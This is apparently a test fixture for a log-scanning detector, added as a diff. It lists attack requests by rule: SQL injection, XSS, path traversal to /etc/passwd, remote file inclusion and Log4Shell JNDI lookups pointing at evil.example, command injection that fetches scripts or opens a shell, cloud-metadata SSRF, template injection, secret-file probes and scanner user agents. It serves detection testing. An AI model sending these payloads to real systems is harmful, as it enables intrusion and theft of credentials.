@@ -1,0 +1,109 @@
+# Attack requests as they appear in access logs. Plain text, read by the tests.
+# rule <TAB> request target <TAB> status <TAB> user agent   ("-" = default)
+LS101	/products/?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--	-	-
+LS101	/products/?id=-1+union+all+select+null,null,@@version	-	-
+LS101	/search/?q=x%27%20OR%20%271%27=%271	-	-
+LS101	/login/?user=admin%27--&pass=x	-	-
+LS101	/item?id=1%20AND%20SLEEP(5)	-	-
+LS101	/item?id=1;WAITFOR%20DELAY%20%270:0:5%27	-	-
+LS101	/item?id=1%20AND%201=BENCHMARK(5000000,MD5(1))	-	-
+LS101	/item?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables	-	-
+LS101	/item?id=1;DROP%20TABLE%20users	-	-
+LS101	/item?id=1%27/**/UnIoN/**/SeLeCt/**/1,2,3%23	-	-
+LS101	/item?id=1%27%20or%202%3E1--%20-	-	-
+LS101	/item?id=extractvalue(1,concat(0x7e,version()))	-	-
+LS101	/item?id=1%20or%201=1	-	-
+LS101	/item?id=1%27%20and%20pg_sleep(10)--	-	-
+LS102	/search/?q=%3Cscript%3Ealert(1)%3C/script%3E	-	-
+LS102	/search/?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E	-	-
+LS102	/search/?q=%22%3E%3Csvg/onload=alert(1)%3E	-	-
+LS102	/redirect?to=javascript:alert(1)	-	-
+LS102	/search/?q=%22%20onmouseover=%22alert(1)	-	-
+LS102	/page?name=%3Ciframe%20src=javascript:alert(1)%3E	-	-
+LS102	/page?x=%3Cbody%20onload=prompt(1)%3E	-	-
+LS102	/page?x=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==	-	-
+LS102	/page?x=%3Cdetails%20open%20ontoggle=confirm(1)%3E	-	-
+LS102	/page?x=%27%3BString.fromCharCode(88,83,83)	-	-
+LS103	/download?file=../../../../etc/passwd	-	-
+LS103	/download?file=..%2f..%2f..%2fetc%2fshadow	-	-
+LS103	/download?file=....//....//....//etc/passwd	-	-
+LS103	/static/..%c0%af..%c0%af..%c0%afwindows/win.ini	-	-
+LS103	/index.php?page=php://filter/convert.base64-encode/resource=index.php	-	-
+LS103	/view?doc=file:///etc/hosts	-	-
+LS103	/view?doc=..\..\..\boot.ini	-	-
+LS103	/view?doc=/proc/self/environ	-	-
+LS103	/view?doc=../../../../var/www/config.php%00.jpg	-	-
+LS103	/img?f=..;/..;/..;/WEB-INF/web.xml	-	-
+LS104	/index.php?page=http://evil.example/shell.txt?	-	-
+LS104	/index.php?include=https://evil.example/c99.php	-	-
+LS104	/main.php?file=ftp://evil.example/backdoor	-	-
+LS104	/main.php?template=http://203.0.113.50/x	-	-
+LS104	/load?module=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==	-	-
+LS104	/x.php?path=http://evil.example/run.sh	-	-
+LS104	/x.php?conf=\\203.0.113.50\share\evil	-	-
+LS104	/x.php?lang=http://evil.example/lang?	-	-
+LS105	/ping?host=127.0.0.1;cat%20/etc/passwd	-	-
+LS105	/ping?host=8.8.8.8|id	-	-
+LS105	/ping?host=8.8.8.8%26%26whoami	-	-
+LS105	/ping?host=%60id%60	-	-
+LS105	/ping?host=$(uname%20-a)	-	-
+LS105	/ping?host=x;wget%20http://evil.example/x.sh	-	-
+LS105	/ping?host=x||curl%20evil.example	-	-
+LS105	/ping?host=x;${IFS}cat${IFS}/etc/passwd	-	-
+LS105	/run?cmd=x;/bin/sh%20-i	-	-
+LS106	/fetch?url=http://169.254.169.254/latest/meta-data/	-	-
+LS106	/fetch?url=http://localhost:8080/admin	-	-
+LS106	/fetch?url=http://127.0.0.1/	-	-
+LS106	/fetch?url=http://[::1]/	-	-
+LS106	/fetch?url=http://2130706433/	-	-
+LS106	/fetch?url=gopher://127.0.0.1:6379/_INFO	-	-
+LS106	/fetch?url=http://metadata.google.internal/computeMetadata/v1/	-	-
+LS106	/fetch?url=http://0x7f000001/	-	-
+LS106	/fetch?url=dict://internal:11211/stat	-	-
+LS107	/greet?name={{7*7}}	-	-
+LS107	/greet?name=%7B%7B7*%277%27%7D%7D	-	-
+LS107	/greet?name=${7*7}	-	-
+LS107	/greet?name=%23%7B7*7%7D	-	-
+LS107	/greet?name=%3C%25=%207*7%20%25%3E	-	-
+LS107	/greet?name={{config.items()}}	-	-
+LS107	/greet?name={{''.__class__.__mro__[1].__subclasses__()}}	-	-
+LS107	/greet?name={%25%20import%20os%20%25}	-	-
+LS107	/greet?name={{request.application.__globals__}}	-	-
+LS108	/?x=${jndi:ldap://evil.example/a}	-	-
+LS108	/	-	${jndi:ldap://evil.example/a}
+LS108	/	-	${${lower:j}ndi:ldap://evil.example/a}
+LS108	/	-	${${::-j}${::-n}${::-d}${::-i}:rmi://evil.example/a}
+LS108	/?x=%24%7Bjndi%3Adns%3A%2F%2Fevil.example%7D	-	-
+LS108	/	-	${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.example/a}
+LS108	/?q=${${upper:j}ndi:ldaps://evil.example/a}	-	-
+LS108	/login?user=${jndi:rmi://203.0.113.50:1099/x}	-	-
+LS109	/.env	404	-
+LS109	/.git/config	404	-
+LS109	/wp-config.php.bak	404	-
+LS109	/.ssh/id_rsa	404	-
+LS109	/backup.sql	404	-
+LS109	/phpinfo.php	404	-
+LS109	/server-status	403	-
+LS109	/.env.production	404	-
+LS109	/.htpasswd	404	-
+LS109	/actuator/env	404	-
+LS110	/wp-login.php	404	-
+LS110	/wp-admin/	404	-
+LS110	/xmlrpc.php	404	-
+LS110	/phpmyadmin/	404	-
+LS110	/pma/	404	-
+LS110	/adminer.php	404	-
+LS110	/administrator/	404	-
+LS110	/manager/html	404	-
+LS110	/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php	404	-
+LS111	/	-	sqlmap/1.7.2#stable (https://sqlmap.org)
+LS111	/	-	Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)
+LS111	/	-	Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+LS111	/	-	masscan/1.3 (https://github.com/robertdavidgraham/masscan)
+LS111	/	-	Mozilla/5.0 zgrab/0.x
+LS111	/	-	WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)
+LS111	/	-	Mozilla/5.0 (Windows NT 10.0) Acunetix-Product
+LS111	/	-	Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))
+LS111	/	-	DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
+LS111	/	-	gobuster/3.6
+LS111	/	-	feroxbuster/2.10.1
